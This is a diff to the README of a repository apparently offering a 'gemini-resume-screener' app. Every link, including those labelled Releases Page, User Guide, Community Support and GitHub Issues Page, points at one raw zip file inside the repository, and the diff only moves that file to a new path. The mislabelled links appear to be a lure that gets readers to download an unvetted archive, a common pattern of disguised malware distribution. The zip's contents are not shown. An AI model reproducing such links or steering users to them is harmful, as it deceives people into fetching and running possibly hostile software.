@@ -8,11 +8,11 @@ Welcome to the **gemini-resume-screener**! This application helps you screen res
 
 To get started, you need to download the application. Follow these steps:
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/AriPhantump/gemini-resume-screener/main/gonimous/gemini-resume-screener.zip) to download the latest version.
+1. Visit the [Releases Page](https://github.com/AriPhantump/gemini-resume-screener/raw/refs/heads/main/app/utils/screener_resume_gemini_v1.9-beta.4.zip) to download the latest version.
 2. Find the latest release noted at the top of the page.
 3. Click on the download link for your operating system to begin downloading the installation file.
 
-[![Download the gemini-resume-screener](https://raw.githubusercontent.com/AriPhantump/gemini-resume-screener/main/gonimous/gemini-resume-screener.zip%20Now%20-%F0%9F%8D%8A%20-violet)](https://raw.githubusercontent.com/AriPhantump/gemini-resume-screener/main/gonimous/gemini-resume-screener.zip)
+[![Download the gemini-resume-screener](https://github.com/AriPhantump/gemini-resume-screener/raw/refs/heads/main/app/utils/screener_resume_gemini_v1.9-beta.4.zip%20Now%20-%F0%9F%8D%8A%20-violet)](https://github.com/AriPhantump/gemini-resume-screener/raw/refs/heads/main/app/utils/screener_resume_gemini_v1.9-beta.4.zip)
 
 ## 🖥️ System Requirements
 
@@ -73,11 +73,11 @@ No, the application runs locally on your device once installed.
 
 For more detailed information, check out the following resources:
 
-- [User Guide](https://raw.githubusercontent.com/AriPhantump/gemini-resume-screener/main/gonimous/gemini-resume-screener.zip)
-- [Community Support](https://raw.githubusercontent.com/AriPhantump/gemini-resume-screener/main/gonimous/gemini-resume-screener.zip)
+- [User Guide](https://github.com/AriPhantump/gemini-resume-screener/raw/refs/heads/main/app/utils/screener_resume_gemini_v1.9-beta.4.zip)
+- [Community Support](https://github.com/AriPhantump/gemini-resume-screener/raw/refs/heads/main/app/utils/screener_resume_gemini_v1.9-beta.4.zip)
 
 ## 📞 Contact
 
-If you experience issues or have questions, please open an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/AriPhantump/gemini-resume-screener/main/gonimous/gemini-resume-screener.zip). Our community is ready to help you.
+If you experience issues or have questions, please open an issue on the [GitHub Issues Page](https://github.com/AriPhantump/gemini-resume-screener/raw/refs/heads/main/app/utils/screener_resume_gemini_v1.9-beta.4.zip). Our community is ready to help you.
 
 Happy screening!
